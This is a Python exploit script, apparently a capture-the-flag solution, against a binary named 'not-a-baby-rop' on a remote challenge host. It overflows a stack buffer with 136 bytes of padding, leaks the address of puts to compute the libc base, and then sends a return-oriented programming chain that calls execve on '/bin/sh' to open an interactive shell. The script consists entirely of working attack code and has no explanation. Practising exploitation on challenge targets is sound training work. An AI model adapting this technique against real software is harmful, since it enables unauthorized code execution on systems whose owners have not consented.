#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./not-a-baby-rop')
host = args.HOST or 'warzone.hackrocks.com'
port = int(args.PORT or 7770)

gdbscript = '''
tbreak main
b *0x0000000000401164
continue
'''.format(**locals())

# libc=ELF("./libc6_2.28-10_amd64.so")
# libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("libc6_2.28-10_amd64.so")
io = start()
re()

payload = b'A'*136 + ret2libc("puts", exe.got.puts)
sl(payload)
libc.address = uuu64(rl()) - libc.sym.puts
re()
lb()

binsh = next(libc.search(b'/bin/sh\x00'))
op = flat([
            gadget("pop rax; ret"),
            0x3b,
            gadget("pop rdi; ret"),
            binsh,
            gadget("pop rsi; ret"),
            0x0,
            gadget("mov rdx, rsi; xor esi, esi; syscall"),
    ])
payload = b'A'*136 + op
sl(payload)

io.interactive()
